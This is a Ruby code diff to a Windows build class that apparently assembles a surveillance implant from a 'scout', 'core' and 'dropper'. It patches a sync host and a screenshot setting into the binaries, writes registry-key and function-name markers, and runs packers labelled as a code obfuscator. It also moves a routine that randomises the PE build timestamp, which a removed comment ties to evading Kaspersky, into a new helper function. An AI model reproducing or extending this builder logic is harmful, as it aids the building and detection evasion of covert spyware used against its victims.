@@ -35,17 +35,16 @@ class BuildWindows < Build
     # invoke the generic patch method with the new params
     super
 
-    if File.exist? path('scout')
-      params[:core] = 'scout'
-      params[:config] = nil
-      # invoke the generic patch method with the new params
-      super
-      patch_file(:file => 'scout') do |content|
-        host = @factory.configs.first.sync_host
-        raise "Sync host not found" unless host
-        content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
-        content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
-      end
+    # patch the scout
+    params[:core] = 'scout'
+    params[:config] = nil
+    super
+
+    patch_file(:file => 'scout') do |content|
+      host = @factory.configs.first.sync_host
+      raise "Sync host not found" unless host
+      content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
+      content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
     end
 
     # calculate the function name for the dropper
@@ -56,12 +55,6 @@ class BuildWindows < Build
         # patching for the function name
         marker = "Funcname"
         content.binary_patch 'PFTBBP', @funcname
-
-        # patching the build time (for kaspersky)
-        marker = "Build time"
-        offset = content.index("PE\x00\x00")
-        raise "offset is nil" if offset.nil?
-        content.binary_patch_at_offset offset + 8, SecureRandom.random_bytes(4)
 
         # the new registry key
         marker = "Registry key"
@@ -100,13 +93,19 @@ class BuildWindows < Build
       end
     end
 
+    # patching the build time
+    patch_build_time('scout')
+    patch_build_time('core')
+    patch_build_time('core64')
+
     # code obfuscator
     CrossPlatform.exec path('packer32'), "#{path('core')}"
     CrossPlatform.exec path('packer64'), "#{path('core64')}"
 
     # add random bytes to codec, rapi and sqlite
     CrossPlatform.exec path('packer'), "#{path('codec')}"
-    add_random(path('rapi'))
+
+    patch_build_time(path('sqlite'))
     add_random(path('sqlite'))
 
   end
@@ -428,6 +427,18 @@ class BuildWindows < Build
 
     # change the infos
     CrossPlatform.exec path('verpatch'), "/fn /va #{file} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
+  end
+
+  def patch_build_time(file)
+    patch_file(:file => file) do |content|
+      begin
+        offset = content.index("PE\x00\x00")
+        raise if offset.nil?
+        content.binary_patch_at_offset offset + 8, SecureRandom.random_bytes(4)
+      rescue
+        raise "build time offset not found"
+      end
+    end
   end
 
 end
